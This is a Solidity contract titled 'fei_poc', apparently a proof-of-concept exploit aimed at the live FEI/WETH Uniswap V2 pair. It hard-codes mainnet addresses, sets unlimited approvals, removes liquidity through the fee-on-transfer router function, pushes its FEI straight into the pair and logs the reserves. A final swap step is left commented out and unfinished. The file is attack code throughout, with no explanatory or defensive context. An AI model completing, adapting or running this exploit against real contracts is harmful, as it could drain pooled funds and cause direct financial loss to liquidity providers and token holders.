// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


import "./IERC20.sol";
import "./console.sol";
import "./IUniswapV2pair.sol";


contract fei_poc{
    address public constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    address public constant FEI_WETH = 0x94B0A3d511b6EcDb17eBF877278Ab030acb0A878;
    address public constant Uni_Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function set_approve() public{
        IERC20(FEI).approve(Uni_Router, type(uint).max);
        IERC20(WETH).approve(Uni_Router, type(uint).max);
        IERC20(FEI_WETH).approve(Uni_Router, type(uint).max);
    }

    function start() public{
        uint256 balance_router = IERC20(FEI).balanceOf(Uni_Router);
        console.log("------router FEI balance : ", balance_router);

        uint256 liquidity_amount = IERC20(FEI_WETH).balanceOf(address(this));
        console.log("------I have FEI_WETH liquidity_amount...", liquidity_amount);

        address token = FEI;
        uint liquidity = 574821064555237;
        uint amountTokenMin = 1;
        uint amountETHMin = 1;
        uint ETH_AMOUNT = UniswapV2Pair(Uni_Router).removeLiquidityETHSupportingFeeOnTransferTokens(token, liquidity, amountTokenMin, amountETHMin, address(this), block.timestamp);
        console.log("1xxxxxx uniswap ETH_AMOUNT: ", ETH_AMOUNT);

        uint256 fei_balance = IERC20(FEI).balanceOf(address(this));
        console.log("I have FEI: ", fei_balance);

        uint256 liquidity_amount_remain = IERC20(FEI_WETH).balanceOf(address(this));
        console.log("------I have FEI_WETH liquidity_amount_remain...", liquidity_amount_remain);

        IERC20(FEI).transfer(FEI_WETH, fei_balance);
        console.log("2xxxxxx transfer fei to pair...");

        (uint256 r0, uint256 r1, ) = UniswapV2Pair(FEI_WETH).getReserves();
        console.log("FEI_WETH pair reserve: ", r0, r1);

        uint256 router_fei = IERC20(FEI).balanceOf(FEI_WETH);
        console.log("router FEI balance : ", router_fei);

        // uint amount0Out = 0;
        // uint amount1Out = 
        // bytes memory data = "";
        // UniswapV2Pair(FEI_WETH).swap(amount0Out, amount1Out, address(this), data);

    }

    receive() payable external{}




}